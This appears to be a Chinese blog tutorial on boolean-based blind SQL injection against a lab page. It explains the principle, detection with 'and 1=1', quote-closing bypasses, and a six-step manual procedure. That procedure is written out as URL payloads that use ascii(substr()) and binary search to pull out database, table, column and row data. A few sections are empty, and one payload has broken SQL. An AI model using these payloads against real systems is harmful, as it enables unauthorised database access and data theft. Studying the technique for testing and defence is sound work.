# 原创
：  【SQL注入-无回显】布尔盲注：原理、函数、利用过程

# 【SQL注入-无回显】布尔盲注：原理、函数、利用过程

**目录**

[一、布尔盲注（True/False）](#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9A)

[1.1、原理：](#%E5%8E%9F%E7%90%86%EF%BC%9A)

[1.2、判断：](#1.2%E3%80%81%E5%88%A4%E6%96%AD%EF%BC%9A)

[1.3、绕过：](#1.3%E3%80%81%E7%BB%95%E8%BF%87%EF%BC%9A)

[二、相关函数](#%E4%BA%8C%E3%80%81%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0)

[2.1、截取函数](#2.1%E3%80%81%E6%88%AA%E5%8F%96%E5%87%BD%E6%95%B0)

[2.2、转换函数](#2.2%E3%80%81%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0)

[2.3、比较函数 ](#2.3%E3%80%81%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0%C2%A0)

[ 三、利用流程](#%C2%A0%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B)

[四、（手工）利用过程](#%E4%B8%89%E3%80%81%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B)

[4.1、第一步：注入点测试](#3.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9)

[4.2、第二步：猜数据库名长度](#3.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6)

[ 4.3、第三步：猜数据库名（ASCII码）](#3.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%88ASCII%E7%A0%81%EF%BC%89)

[4.4、第四步：猜表名](#3.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%8C%9C%E8%A1%A8%E5%90%8D)

[4.5、第五步：猜字段名](#3.7%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%90%8D)

[4.6、第六步：猜数据](#3.8%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE)

---


## 一、布尔盲注（True/False）

> 
<h3>**1.1、原理：**</h3>
Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如为真时返回access，为假时返回false；或者为真时返回正常页面，为假时跳转到错误页面等。不需要返回结果，仅判断语句是否正常执行


> 
<h3>1.2、判断：</h3>

Bool盲注中通常会配套使用一些判断真假的语句来进行判定。常用的发现Bool盲注的方法是在输入点后面添加and 1=1和and 1=2（该Payload应在怀疑是整型注入的情况下使用）。 


<hr/>
如果题目后端拼接了SQL语句，and 1=1为真时不会影响执行结果，但是and 1=2为假，页面则可能会没有正常的回显。 



> 
<h3>1.3、绕过：</h3>

有时候我们可能会遇到将1=1过滤掉的SQL注入点，这时候我们可以通过修改关键字来绕过过滤，比如将关键字修改为不常见的数值（如1352=1352等）。 


<hr/>
在字符串型注入的时候我们还需要绕过单引号，将Payload修改为如下格式'and'1'='1和'or'1'='2来闭合单引号（第一个引号闭合原句中引号，原句中后面的引号拼接到语句中了）



---


---


## 二、相关函数

> 
<h3>2.1、截取函数</h3>


 mid(a,b,c)从位置b开始，截取a字符串的c位 regexp正则表达式的用法
ord() 函数返回字符串str的最左面字符的ASCII代码值 


> 
<h3>2.2、转换函数</h3>





> 
<h3>2.3、比较函数 </h3>





---


---


##  三、利用流程

> 
第一步：注入点测试
第二步：猜数据库名长度
第三步：猜数据库名（ASCII）
第四步：猜表名
第五步：猜字段名
第六步：猜数据


---


---


## 四、（手工）利用过程

> 
<h3>4.1、第一步：注入点测试</h3>
 加上单引号，无返回数据
且注释后，有返回数据
所以为单引号闭合，存在SQL注入点
<img alt="" height="799" src="https://img-blog.csdnimg.cn/873441d2b1024388be3a12969e6bef88.png" width="1200"/> <img alt="" height="778" src="https://img-blog.csdnimg.cn/fc4081037b2e4a1094d1aec88eecc9e2.png" width="1200"/>

?id=1' and 1=1 --+  页面有返回<img alt="" height="796" src="https://img-blog.csdnimg.cn/d6d9e3d5b0ac4a15adb48bb883431c20.png" width="1200"/>
?id=1' and 1=0 --+ 页面无结果返回

存在SQL盲注


> 
<h3>4.2、第二步：猜数据库名长度</h3>
?id=1' and (length(database()))&gt;7--+页面返回有数据

?id=1' and (length(database()))&gt;8--+页面无结果返回

 当前数据库名称长度为：8


> 
<h3> 4.3、第三步：猜数据库名（ASCII码）</h3>
?id=1' and ascii(substr(database(),1,1))&gt;100--+ 页面返回有数据


?id=1' and ascii(substr(database(),1,1))&lt;150--+ 页面返回有数据

 二分法，一直从中间分下去，直到确定一个值对应的ascii码
通过这个方法判断出整个数据库名


> 
<h3>4.4、第四步：猜表名</h3>
?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+页面返回有数据

 ?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+有返回数据

 采用二分法以此类推得到唯一的值
通过这个方法判断出整个表名


> 
<h3>4.5、第五步：猜字段名</h3>
?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))&gt;50--+   页面返回有数据

?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))&lt;80--+返回有数据

 采用二分法以此类推得到唯一的值
通过这个方法判断出整个字段名


> 
<h3>4.6、第六步：猜数据</h3>
?id=1' and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+  页面返回有数据


?id=1' and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+页面返回有数据

 采用二分法以此类推得到唯一的值
通过这个方法判断出整个数据

